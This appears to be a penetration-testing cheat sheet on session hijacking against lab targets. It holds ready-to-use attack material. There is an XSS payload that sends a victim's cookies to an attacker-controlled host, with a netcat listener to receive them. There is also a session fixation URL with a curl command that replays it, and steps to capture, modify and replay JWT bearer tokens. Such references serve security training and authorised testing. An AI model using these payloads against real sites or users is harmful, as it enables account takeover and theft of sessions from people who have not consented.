# Session Hijacking

!!! tip "Tip"
    Session tokens in URL parameters (not cookies) are the easiest to steal — look for `?session=`, `?token=`, or `?sid=` in links. Check Referer header leakage too.

!!! warning "Watch out"
    HttpOnly cookies can't be stolen via XSS. If the cookie has HttpOnly, pivot to CSRF or session fixation instead of cookie theft.

---

## Identifying Session Cookies

### Using Burp Suite

- Go to **Proxy > HTTP History** and inspect **Set-Cookie** headers.
- Look for session-related values such as `PHPSESSID`, `JSESSIONID`, `auth`, or `sessionid`.

### Using cURL to Capture Cookies

```bash
curl -c cookies.txt -b cookies.txt -v http://10.10.10.10/profile
```

- `-c cookies.txt` → Saves cookies to a file.
- `-b cookies.txt` → Reuses stored cookies in subsequent requests.
- `-v` → Enables verbose output to analyze responses.

### Using Browser DevTools

- Open **Developer Tools** (`F12` in Chrome/Firefox).
- Navigate to **Application > Storage > Cookies**.
- Locate authentication cookies or session tokens.

---

## Session Hijacking Techniques

### XSS Cookie Theft

```html
<script>document.location='http://<attacker-ip>/steal.php?cookie='+document.cookie</script>
```

Listen for the stolen cookie:

```bash
nc -lvnp 80
```

### Session Fixation Attack

Force the victim to use a known session ID:

```
http://10.10.10.10/login?sessionid=ATTACKERSESSION
```

Once the victim logs in, reuse the session:

```bash
curl -b "sessionid=ATTACKERSESSION" http://10.10.10.10/dashboard
```

### JWT Token Theft

1. Capture the `Authorization: Bearer <JWT>` header.
2. Decode the JWT for useful information:

```bash
echo "<JWT Token>" | jwt_tool -d
```

3. Modify the token and replay it:

```bash
curl -H "Authorization: Bearer <MODIFIED_JWT>" http://10.10.10.10/api
```
